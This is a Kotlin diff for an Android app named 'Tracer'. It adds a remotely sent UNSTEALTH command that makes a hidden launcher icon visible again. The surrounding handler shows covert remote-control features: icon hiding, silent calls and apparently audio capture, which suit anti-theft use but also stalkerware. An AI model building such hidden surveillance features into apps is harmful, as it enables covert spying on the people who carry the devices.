@@ -82,6 +82,7 @@ class CommandHandler(
             "AUDIO"       -> handleAudio(sender, args)
             "SILENT_CALL" -> handleSilentCall(sender)
             "STEALTH"     -> handleStealth(sender)
+            "UNSTEALTH"   -> handleUnstealth(sender)
             "BLOCK_APPS"  -> handleBlockApps(sender)
             else          -> reply(sender, "Tracer: comando desconocido ($command)")
         }
@@ -430,9 +431,24 @@ class CommandHandler(
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 PackageManager.DONT_KILL_APP
             )
-            reply(sender, "Tracer STEALTH: icono ocultado. Marca *#*#7223#*#* para volver.")
+            reply(sender, "Tracer STEALTH: icono ocultado. Marca *#*#7223#*#* o envia PIN UNSTEALTH para volver.")
         } catch (e: Exception) {
             reply(sender, "Tracer STEALTH: error — ${e.message}")
+        }
+    }
+
+    // Vía de recuperación alternativa al código secreto *#*#7223#*#*, que en
+    // varias versiones/OEM no se entrega a apps de usuario.
+    private fun handleUnstealth(sender: String) {
+        return try {
+            context.packageManager.setComponentEnabledSetting(
+                ComponentName(context, "com.tracer.app.MainActivityAlias"),
+                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                PackageManager.DONT_KILL_APP
+            )
+            reply(sender, "Tracer UNSTEALTH: icono visible de nuevo en el launcher.")
+        } catch (e: Exception) {
+            reply(sender, "Tracer UNSTEALTH: error — ${e.message}")
         }
     }
 
